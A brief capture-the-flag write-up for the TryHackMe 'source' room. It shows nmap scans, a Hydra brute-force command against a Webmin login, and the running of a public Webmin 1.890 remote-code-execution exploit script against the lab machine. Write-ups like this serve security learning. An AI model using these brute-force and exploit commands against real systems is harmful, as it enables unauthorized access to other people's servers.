# source

**Room Link:** [https://tryhackme.com/room/source](https://tryhackme.com/room/source)



### Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (27) (1).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

No other ports found.

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

### TCP/10000 - HTTP

<figure><img src="../../.gitbook/assets/image (26) (2).png" alt=""><figcaption></figcaption></figure>

Tried to bruteforce the admin password but it blocked my IP after so many attempts, this is clearly not the intended route.

**Kali**

```
git clone https://github.com/vanhauser-thc/thc-hydra.git
cd thc-hydra/
./configure
make
make install

./hydra -S -l admin -s 10000 -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top10000.txt ip-10-10-221-100.eu-west-1.compute.internal http-post-form "/session_login.cgi:user=^USER^&pass=^PASS^:F=Warning!" -V
```





**Kali**

```
git clone https://github.com/foxsin34/WebMin-1.890-Exploit-unauthorized-RCE.git
cd WebMin-1.890-Exploit-unauthorized-RCE/
python webmin-1.890_exploit.py  ip-10-10-221-100.eu-west-1.compute.internal 10000 id
```

<figure><img src="../../.gitbook/assets/image (14) (5).png" alt=""><figcaption></figcaption></figure>

I tried to get a full shell but nothing worked, there was a metasploit exploit which I could do for that but I didn't want to.

















































